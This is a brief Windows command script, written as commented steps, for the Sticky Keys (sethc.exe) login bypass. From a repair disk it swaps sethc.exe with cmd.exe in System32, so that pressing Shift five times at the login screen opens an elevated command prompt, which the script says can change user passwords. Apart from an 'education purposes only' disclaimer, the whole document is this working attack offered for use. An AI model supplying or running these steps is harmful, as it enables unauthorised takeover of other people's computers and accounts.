::Sethc or Sticky Keys exploit for Windows. 
::For education purposes only, I am not responsible for misuse.

::Boot into a Windows repair disk or USB, and navigate to the Command Prompt utility.

::For this example, I am assuming that C: is the drive of your Windows operating system, change if necessary.

::Change the drive to the one that your Windows operating system is located on by typing the drive letter
::followed by a colon:
C:

::Navigate to the System32 directory:
chdir Windows\System32

::Rename CMD (command line terminal) application to anything(I prefer using cmd0):
ren cmd.exe cmd0.exe

::Rename Sticky Keys application as CMD application:
ren sethc.exe cmd.exe

::Rename CMD as Sticky Keys application:
ren cmd0.exe cmd.exe

::Reboot system. When you reach the login screen or any screen after the login screen,
::you can press the SHIFT key five times to open an elevated priveleges command prompt.
::Among other things, this can be used to change priveleges or passwords of users. To
::restore the CMD and Sticky Keys applications, simply repeat these steps.
